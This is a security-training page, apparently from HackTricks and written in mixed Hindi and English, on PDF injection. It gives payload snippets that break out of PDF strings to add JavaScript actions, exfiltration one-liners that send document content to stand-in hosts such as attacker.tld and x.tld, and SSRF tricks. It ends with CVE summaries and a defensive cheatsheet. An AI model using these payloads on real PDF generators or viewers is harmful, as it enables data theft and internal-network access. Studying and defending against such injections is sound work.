# PDF Injection

{{#include ../../banners/hacktricks-training.md}}

**यदि आपका इनपुट किसी PDF फ़ाइल के भीतर परावर्तित हो रहा है, तो आप JavaScript 실행 करने, SSRF करने या PDF की सामग्री चुराने के लिए PDF डेटा inject करने की कोशिश कर सकते हैं।**
PDF सिंटैक्स बेहद permissive है – अगर आप उस string या dictionary से बाहर निकल सकें जो आपके इनपुट को embed कर रही है, तो आप पूरी तरह नए objects (या उसी object में नए keys) जोड़ सकते हैं जिन्हें Acrobat/Chrome खुशी-खुशी parse कर लेंगे।
2024 से कई bug-bounty रिपोर्ट्स ने दिखाया है कि *एक भी unescaped parenthesis या back-slash पर्याप्त* हो सकता है पूरी script execution के लिए।

## TL;DR – आधुनिक Attack Workflow (2024-2026)
1. किसी भी उपयोगकर्ता-नियंत्रित मान को खोजें जो उत्पन्न PDF में **(parenthesis string)**, `/URI ( … )` या `/JS ( … )` field के अंदर आ रहा हो।
2. `) ` inject करें (string को बंद करना) उसके बाद नीचे दिए गए किसी primitive में से एक लगाएँ और syntax को वैध बनाए रखने के लिए फिर एक opening parenthesis डालकर खत्म करें।
3. दुर्भावनापूर्ण PDF को किसी victim को पहुँचाएँ (या किसी backend service को जो फ़ाइल को स्वचालित रूप से render करता हो – blind bugs के लिए बहुत उपयोगी)।
4. आपका payload PDF viewer में चलता है:
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js (देखें CVE-2024-4367)
* Acrobat → Full JavaScript API (यह `this.getPageNthWord` के साथ मनमाना फ़ाइल सामग्री exfiltrate कर सकता है)

Example (annotation link hijack):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*पहला `)` मूल URI स्ट्रिंग को बंद करता है, फिर हम एक नया **Action** dictionary जोड़ते हैं जिसे Acrobat तब निष्पादित करेगा जब उपयोगकर्ता लिंक पर क्लिक करेगा।*

## उपयोगी Injection Primitives
| लक्ष्य | Payload Snippet | नोट्स |
|------|-----------------|-------|
| **JavaScript on open** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | दस्तावेज़ खोलते ही तुरंत निष्पादित होता है (Acrobat में काम करता है, Chrome में नहीं)। |
| **JavaScript on link** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | यदि आप `/Link` annotation को नियंत्रित करते हैं तो यह PDFium & Acrobat में काम करता है। |
| **Blind data exfiltration** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | JS के अंदर `this.getPageNthWord` के साथ जोड़कर सामग्री चोरी करने के लिए उपयोग करें। |
| **Server-Side SSRF** | Same as above but target an internal URL – great when the PDF is rendered by back-office services that honour `/URI`. | ऊपर जैसा ही, लेकिन लक्ष्य एक आंतरिक URL – तब बहुत उपयोगी जब PDF को back-office सेवाएँ render करती हैं जो `/URI` का सम्मान करती हैं। |
| **Additional Actions (/AA)** | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | Page/Annotation/Form dictionary से जुड़ाकर open/focus पर चलाएं। |
| **Line Break for new objects** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | यदि लाइब्रेरी आपको new-line characters इंजेक्ट करने देती है तो आप पूरी तरह नए objects बना सकते हैं। |

## Embedded Actions as Injection Targets
PDF viewers `/OpenAction` और `/AA` (Additional Actions) जैसी **embedded actions** को पहले-कक्षा की विशेषताओं के रूप में मानते हैं जो दस्तावेज़ खुलने पर या किसी विशिष्ट घटना होने पर चल सकती हैं। यदि आप किसी भी dictionary में इंजेक्ट कर सकते हैं जो actions स्वीकार करता है (Catalog, Page, Annotation, or Form field), तो आप एक `/AA` tree graft कर सकते हैं और open/focus पर JavaScript को trigger कर सकते हैं।

Example payload for **generator-side object injection** (close the original string/dictionary and inject `/AA`):
```pdf
) >> /AA << /O << /S /JavaScript /JS (app.alert('AA fired')) >> >> (
```
This pattern matches recent jsPDF issues where attacker-controlled input passed into `addJS` (or certain AcroForm fields) breaks out of the intended JavaScript string and injects an **Additional Action** dictionary.

## Blind Enumeration Trick
Gareth Heyes (PortSwigger) ने एक one-liner जारी किया जो किसी अनजान document के अंदर हर object को enumerate करता है — तब काम आता है जब आप generated PDF नहीं देख सकते:
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
कोड Acrobat DOM पर इटरेट करता है और हर property/value जोड़ी के लिए आउटबाउंड अनुरोध करता है, जिससे आपको फ़ाइल का *JSON-ish* dump मिलता है।
पूर्ण तकनीक के लिए white-paper “Portable Data **ex**Filtration” देखें।

## वास्तविक बग (2023-2026)
* **CVE-2026-25755** – jsPDF `addJS` PDF object injection: हमलावर-नियंत्रित स्ट्रिंग्स JS literal को बंद कर सकती हैं और `/AA` → `/O` → `/JavaScript` actions इंजेक्ट कर सकती हैं जो open/focus पर फ़ायर होती हैं।
* **CVE-2024-4367** – Firefox के PDF.js (4.2.67 से पहले) में crafted `/JavaScript` action के माध्यम से sandbox बायपास करके arbitrary JavaScript execution संभव हुआ।
* **Bug bounty 2024-05** – एक प्रमुख fintech ने customer-supplied invoice notes की अनुमति दी जो `/URI` में आ गए; रिपोर्ट को $10k दिया गया जब `file:///` URI का उपयोग करके internal metadata host पर SSRF दिखाया गया।
* **CVE-2023-26155** – `node-qpdf` में unsanitised PDF path के माध्यम से command-injection यह दिखाता है कि backslashes और parentheses को escape करना कितना महत्वपूर्ण है, यहाँ तक कि PDF layer से भी पहले।

## रक्षात्मक चीटशीट
1. **कभी भी कच्चे उपयोगकर्ता इनपुट को** `(`…`)` strings या names के अंदर concatenate न करें। Escape `\`, `(`, `)` जैसा कि PDF spec §7.3 में आवश्यक है या hex strings `<...>` का उपयोग करें।
2. यदि आप links बनाते हैं, तो `/URI (https://…)` को प्राथमिकता दें जिसे आप *पूरी तरह* URL-encode करें; client viewers में `javascript:` schemes को ब्लॉक करें।
3. PDFs को post-process करते समय `/OpenAction`, `/AA` (additional actions), `/Launch`, `/SubmitForm` और `/ImportData` dictionaries को strip या validate करें।
4. Server साइड पर, untrusted PDFs को ऐसे *headless converter* (उदा. qpdf –decrypt –linearize) के साथ render करें जो JavaScript और external actions को हटाता/हटाती है।
5. PDF viewers को अपडेट रखें; PDF.js < 4.2.67 और Acrobat Reader के July 2024 से पहले के patches आसान code execution की अनुमति देते हैं।
6. यदि आप client-side generators (उदा., jsPDF) का उपयोग करते हैं, तो कभी भी untrusted input को `addJS` या AcroForm setters में पास न करें जो अंततः PDF action dictionaries के अंदर चले जाएँ।

## संदर्भ
* Gareth Heyes, “Portable Data exFiltration – XSS for PDFs”, PortSwigger Research (May 2024 में अपडेट)। <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (Apr 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
* GitLab Advisory Database, “CVE-2026-25755: jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method” (Feb 2026). <https://advisories.gitlab.com/pkg/npm/jspdf/CVE-2026-25755/>
* Adobe Acrobat Help, “Acrobat shows a warning message when signing documents” (Sep 2025) – embedded actions like OpenAction/AA. <https://helpx.adobe.com/acrobat/kb/embedded-action-signing-warning.html>
{{#include ../../banners/hacktricks-training.md}}
